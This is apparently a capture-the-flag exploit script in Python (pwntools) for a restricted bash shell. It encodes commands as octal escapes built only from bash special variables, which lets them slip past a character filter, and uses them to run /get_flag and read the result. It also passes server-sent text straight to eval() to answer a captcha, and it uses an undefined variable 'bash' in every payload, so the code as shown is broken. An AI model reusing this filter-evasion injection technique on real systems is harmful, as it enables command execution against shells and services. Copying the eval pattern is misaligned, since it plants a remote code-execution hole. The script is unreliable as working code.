#!/usr/bin/env python
import sys, os
from pwn import *
from time import sleep

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)

REMOTE = len(sys.argv) > 2

if REMOTE:
    r = remote(HOST, PORT)
else:
    r = process('/bin/bash')

n = dict()
n[0] = '$#'
n[1] = '$(($#<$$))'
n[2] = '$(({n1}<<{n1}))'.format(n1=n[1])
n[3] = '$(({n2}#{n1}{n1}))'.format(n2=n[2], n1=n[1])
n[4] = '$(({n2}#{n1}{n0}{n0}))'.format(n2=n[2], n1=n[1], n0=n[0])
n[5] = '$(({n2}#{n1}{n0}{n1}))'.format(n2=n[2], n1=n[1], n0=n[0])
n[6] = '$(({n2}#{n1}{n1}{n0}))'.format(n2=n[2], n1=n[1], n0=n[0])
n[7] = '$(({n2}#{n1}{n1}{n1}))'.format(n2=n[2], n1=n[1])

def str_to_oct(cmd):
    s = "$\\'"
    for _ in cmd:
        o = ('%s' % (oct(ord(_)).lstrip('0'))).rjust(3, '0')
        e = '\\\\' + ''.join(n[int(d)] for d in o)
        s += e
    s += "\\'"
    return s

def arg_to_cmd(arg):
    cmd = '{'
    cmd += ','.join(str_to_oct(_) for _ in arg)
    cmd += ',}'
    return cmd

for _ in n.keys():
    log.debug(n[_])

# /bin/bash<<<$'\123'
# ${!#}<<<$\'\\$#$#$#\'

cmd = 'bash -c tail$IFS-F$IFS/tmp/log|/get_flag|tee$IFS/tmp/result&'
exp = "%s<<<%s" % (bash, arg_to_cmd(cmd.split()))
r.sendline(exp)

r.recvuntil('captcha:\n')
fuck = eval(r.recv())
cmd = 'bash -c echo${IFS}%s>/tmp/log' % (str(fuck))
exp = "%s<<<%s" % (bash, arg_to_cmd(cmd.split()))
r.sendline(exp)

cmd = 'cat /tmp/result'
exp = "%s<<<%s" % (bash, arg_to_cmd(cmd.split()))
r.sendline(exp)

r.interactive()
